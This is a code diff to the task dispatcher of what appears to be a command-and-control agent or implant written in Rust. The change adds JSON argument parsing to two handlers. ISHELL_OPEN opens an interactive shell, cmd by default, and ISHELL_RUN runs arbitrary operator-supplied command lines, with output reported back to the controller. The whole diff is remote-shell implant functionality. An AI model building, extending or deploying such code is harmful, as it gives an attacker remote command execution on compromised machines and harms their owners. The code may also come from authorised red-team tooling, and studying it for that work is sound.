@@ -428,7 +428,16 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) -> bool {
     let typ = task.typ.to_uppercase();
     match typ.as_str() {
         "ISHELL_OPEN" => {
-            let shell = if task.args.is_empty() { "cmd" } else { task.args.trim() };
+            let shell_arg = if task.args.trim_start().starts_with('{') {
+                serde_json::from_str::<serde_json::Value>(&task.args)
+                    .ok()
+                    .and_then(|v| v.get("shell").and_then(|s| s.as_str()).map(str::to_owned))
+            } else {
+                None
+            };
+            let shell = shell_arg.as_deref()
+                .or_else(|| if task.args.trim().is_empty() { Some("cmd") } else { None })
+                .unwrap_or_else(|| task.args.trim());
             match ishell_open(shell) {
                 Ok(())   => t.send_result(task.id, &format!("[+] shell opened: {shell}"), ""),
                 Err(e)   => t.send_result(task.id, "", &e),
@@ -437,7 +446,15 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) -> bool {
         }
 
         "ISHELL_RUN" => {
-            let result = ishell_run(&task.args, 30_000);
+            let cmd_line = if task.args.trim_start().starts_with('{') {
+                serde_json::from_str::<serde_json::Value>(&task.args)
+                    .ok()
+                    .and_then(|v| v.get("cmd").and_then(|c| c.as_str()).map(str::to_owned))
+            } else {
+                None
+            };
+            let cmd_line = cmd_line.as_deref().unwrap_or(task.args.as_str());
+            let result = ishell_run(cmd_line, 30_000);
             match result {
                 Ok(out)  => t.send_result(task.id, &out, ""),
                 Err(e)   => t.send_result(task.id, "", &e),
